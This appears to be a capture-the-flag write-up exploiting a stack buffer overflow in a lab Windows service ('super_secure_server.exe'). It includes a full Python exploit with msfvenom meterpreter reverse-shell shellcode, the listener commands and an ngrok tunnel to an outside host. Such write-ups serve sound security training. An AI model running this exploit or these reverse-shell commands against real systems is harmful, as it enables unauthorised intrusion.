

SCANNING
=========
````
ports 
======

21     ftp
445    microsoft win server 2008 R2 "almost"
5357   http api 2.0 
1887  filex-lport

#other services are for windows and seemed helpless 
#http server is unavailable so let's focus on ftp 
````


ENUMERATION
===========
```
ftp enum :
ftp version is FileZilla 
Try default credts user&pass = ftp and worked :) 

-ftp interaction :

opened filezella enterd host,name,pass,port 21
-found same folders let's check them !
 
#file super_secure_server.exe   , it is a 32-bit application PE32
#essfunc.dll   , it is an dll file for this executable to run 
````


when you try to interact with port 1887 you will get :

![image](https://user-images.githubusercontent.com/67979878/129482250-97cf013a-b154-45fa-8a9d-98c8ab8927ca.png)

so let's put all what we found together ! 

it seems this supersecure sever is what is running on this port so let's explore this software .

Try strings with the software found command `SECRET` which we can use also 

now let's try understand this software :

let's make our win7 as the target and our kali as attacker .

run super_secure_server.exe on win7 , to interact with kali you need to know the following :

```
win 7 ip address
port running super_secure_server.exe
```
 - to know ip_address simply type in cmd > `ipconfig` you will find it in my case it is 192.168.1.8 
 - to know port go to taskmanager and search for the PID of supe_secure_server.exe , then at cmd type > `netstat -ano ` 
 - then search for PID associated port number , now you are ready to go 

![image](https://user-images.githubusercontent.com/67979878/129482623-1963e607-a5e9-4116-a563-fcc201410e07.png)


now let's play :)

trying various inputs and testing Buffer_over_flow

![image](https://user-images.githubusercontent.com/67979878/129482785-2593e9ad-2da2-4a53-a929-0549841d5e1b.png)

after many tries ..


![image](https://user-images.githubusercontent.com/67979878/129482818-72e16f1a-82fc-4b0c-95a4-3fa35711114b.png)
![image](https://user-images.githubusercontent.com/67979878/129482831-8ff0b41c-3bc3-42dc-a550-d4e78facb5f8.png)


it seems like BOF hmmmmmm.. 

let's open this software with immunity debugger in win7 and see ..

doing same input in kali side :
![image](https://user-images.githubusercontent.com/67979878/129482947-9446a806-2ca8-4020-bd94-9cc128a7071f.png)

#### so we can over write EIP 

now we have made sure it is BOF .

exploiting BOF :
-------------------
````
- get offset till EIP
- get address of jmp esp instruction
- find bad characters
- generate shell code
- payload ="A"*offset + 'address' +shell code

````
 
let's make a unique pattern and then get offset till EIP .

kali side :
--------------
$ msf-pattern_create -l 2000  

now let's send "SECRET "+pattern created and see EIP value now 

![image](https://user-images.githubusercontent.com/67979878/129483128-585ba94b-d5de-45e1-a12b-a05642f52a7f.png)

let's check offset for this value  68423268

![image](https://user-images.githubusercontent.com/67979878/129483175-7b955723-b588-44e7-9a2c-a5df92157fdc.png)


now let's under stand the full image of BOF :

````
we want final payload to be like 

payload="A"*offset+'jmp esp instrunction address' + 'NOP'+shell code

"A"*offset : this is just to let us reach the EIP address 
ESP : points to top of the stack in other words above last data entered the stack , so if it the shell code it will be points to top of it 
EIP : points to next instruction to be executed so if it points to instuction **jmp esp** it will execute our shell code  
NOP : to make space between EIP and shell code to avoid any possible errors , in hex '\x90'
shell code : what will return reverse shell to us 

````

To find jmp esp instruction esp we have multiple ways but i will use mona.py script in immunity debugger you can download it then put in immunitydebuuger/libraries 

![image](https://user-images.githubusercontent.com/67979878/129483679-21e2e735-9999-470c-981b-b210eb9c466f.png)

results :

##### note : choose any address but must have false protections ! 
![image](https://user-images.githubusercontent.com/67979878/129483689-273244b5-8458-40c7-be13-c68e10a10855.png)

i pick this : 625012BA 
to write it in the code we must follow little endian way : EIP='/xBA/x12/x50/x62'

creating shell code with msfvenom :

from https://www.revshells.com/ choose msfvenom and then remember the software is 32 bit so remove x64 from the payload and listener
change lport and lhost for yours 

`$msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=1234 -b '\x00' -f py`  

listener :

`msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.9; set lport 1234; exploit"`

let's set our listner 

now it is time to automate this somehow let's open up a simple python script 


````
#!/bin/python env 

import socket 

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #version 4 , tcp communication
s.connect(('192.168.1.8',13337))  #ip in string form and port in integer form
#buf is generated by msfvenom
buf =  b"\x90"*10  
buf += b"\xda\xdf\xbb\x67\xc4\x35\xee\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x59\x31\x5a\x19\x83\xc2\x04\x03\x5a\x15\x85"
buf += b"\x31\xc9\x06\xc6\xba\x32\xd7\xb8\x8b\xe0\x5e\xdd\x88"
buf += b"\x8f\x33\x2d\xda\xc2\xbf\xc6\x8e\xf6\x8e\x27\xa5\x85"
buf += b"\xd8\xd8\x0d\x23\x3f\xd7\xb1\x18\x03\x76\x4e\x63\x50"
buf += b"\x58\x6f\xac\xa5\x99\xa8\x7a\xc3\x76\x64\x2a\xa0\xda"
buf += b"\x99\x5f\xf4\xe6\x98\x8f\x72\x56\xe3\xaa\x45\x22\x5f"
buf += b"\xb4\x95\x41\x07\x96\x9e\x1d\xa0\xd7\x73\xcd\x55\x1e"
buf += b"\x07\xd1\x64\x5e\xa1\xa2\xb3\x2b\x33\x62\x8a\xeb\x98"
buf += b"\x4b\x22\xe6\xe1\x8c\x85\x19\x94\xe6\xf5\xa4\xaf\x3d"
buf += b"\x87\x72\x25\xa1\x2f\xf0\x9d\x05\xd1\xd5\x78\xce\xdd"
buf += b"\x92\x0f\x88\xc1\x25\xc3\xa3\xfe\xae\xe2\x63\x77\xf4"
buf += b"\xc0\xa7\xd3\xae\x69\xfe\xb9\x01\x95\xe0\x66\xfd\x33"
buf += b"\x6b\x84\xe8\x44\x94\x56\x15\x19\x02\x9a\xd8\xa2\xd2"
buf += b"\xb4\x6b\xd0\xe0\x1b\xc0\x7e\x48\xd3\xce\x79\xd9\xf3"
buf += b"\xf0\x56\x61\x93\x0e\x57\x91\xbd\xd4\x03\xc1\xd5\xfd"
buf += b"\x2b\x8a\x25\x01\xfe\x26\x2c\x95\xc1\x1e\x31\x6c\xaa"
buf += b"\x5c\x32\x6a\xf8\xe9\xd4\x22\xac\xb9\x48\x83\x1c\x79"
buf += b"\x39\x6b\x77\x76\x66\x8b\x78\x5d\x0f\x26\x97\x0b\x67"
buf += b"\xdf\x0e\x16\xf3\x7e\xce\x8d\x79\x40\x44\x27\x7d\x0f"
buf += b"\xad\x42\x6d\x78\xca\xac\x6d\x79\x7f\xac\x07\x7d\x29"
buf += b"\xfb\xbf\x7f\x0c\xcb\x1f\x7f\x7b\x48\x67\x7f\xfa\x78"
buf += b"\x13\xb6\x68\xc4\x4b\xb7\x7c\xc4\x8b\xe1\x16\xc4\xe3"
buf += b"\x55\x43\x97\x16\x9a\x5e\x84\x8a\x0f\x61\xfc\x7f\x87"
buf += b"\x09\x02\x59\xef\x95\xfd\x8c\x73\xd1\x01\x52\x5c\x7a"
buf += b"\x69\xac\xdc\x7a\x69\xc6\xdc\x2a\x01\x1d\xf2\xc5\xe1"
buf += b"\xde\xd9\x8d\x69\x54\x8c\x7c\x08\x69\x85\x21\x94\x6a"
buf += b"\x2a\xfa\x27\x10\x43\xfd\xc8\xe5\x4d\x9a\xc9\xe5\x71"
buf += b"\x9c\xf6\x33\x48\xea\x39\x80\xef\xe5\x0c\xa5\x46\x6c"
buf += b"\x6e\xf9\x99\xa5"

offset=997
payload  = "SECRET "
payload += "A"*offset 
payload +="\xba\x12\x50\x62"
payload +=buf
s.send(payload)
s.close()

````

### make sure software is running in win7 and your listener is working before running the script 

run it now :

![image](https://user-images.githubusercontent.com/67979878/129485033-60116127-bb39-4d4a-9f68-0e7a476c6ad4.png)

Here we go ! 

let's exploit it at the machine now :) 

small changes 
```
set up your ngrok 
'ngrok just simply map an ip and port to yours it acts like a vps'
$ ./ngrok tcp 1234
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io  LPORT=11379 -b '\x00' -f py    #generate new buf
$ msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 1234; exploit" #listenner                      
```
run the script now 



![image](https://user-images.githubusercontent.com/67979878/129485416-a6afbfc0-002d-43ed-8964-7ba5774b6cd0.png)


flag is at c:/Users/Administartor/Desktop/flag.txt


# done











